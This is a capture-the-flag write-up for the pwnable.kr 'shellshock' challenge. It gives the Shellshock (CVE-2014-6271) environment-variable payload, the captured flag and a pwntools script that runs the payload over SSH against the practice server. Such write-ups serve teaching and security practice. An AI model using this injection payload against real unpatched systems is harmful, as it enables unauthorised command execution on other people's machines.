# pwnable.kr shellshock writeup by pwn4magic

Challenge Description :
```
Mommy, there was a shocking news about bash.
I bet you already know, but lets just make it sure :)


ssh shellshock@pwnable.kr -p2222 (pw:guest)
```

After we connect to the pwnable.kr server, we can see these files :

```bash
shellshock@prowl:~$ ls -la
total 980
drwxr-x---   5 root shellshock       4096 Oct 23  2016 .
drwxr-xr-x 114 root root             4096 May 19 15:59 ..
-r-xr-xr-x   1 root shellshock     959120 Oct 12  2014 bash
d---------   2 root root             4096 Oct 12  2014 .bash_history
-r--r-----   1 root shellshock_pwn     47 Oct 12  2014 flag
dr-xr-xr-x   2 root root             4096 Oct 12  2014 .irssi
drwxr-xr-x   2 root root             4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x   1 root shellshock_pwn   8547 Oct 12  2014 shellshock
-r--r--r--   1 root root              188 Oct 12  2014 shellshock.c
shellshock@prowl:~$ 
```

Obviously, we'll read the flag using the shellshock vulnerability. What is shellshock ?

Shellshock is a code injection attack in Bash 4.3 and earlier.

Simply our payload will go like this :

```bash
env x='() { :;}; /bin/cat flag' ./shellshock
```

And Voilà

```bash
shellshock@prowl:~$ env x='() { :;}; /bin/cat flag' ./shellshock
only if I knew CVE-2014-6271 ten years ago..!!
Segmentation fault (core dumped)
shellshock@prowl:~$ 
```

Flag : `only if I knew CVE-2014-6271 ten years ago..!!`

pwntools exploit :

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'DEBUG'

log.info('pwnable.kr - shellshock exploit by pwn4magic')

shell = ssh('shellshock', 'pwnable.kr', password='guest', port=2222)

sh = shell.run('env x="() { :;}; /bin/cat flag" ./shellshock')

log.success(sh.recvline())
```

\ (•◡•) / yay! See ya!

References : https://metalkey.github.io/shellshock-explained--exploitation-tutorial.html
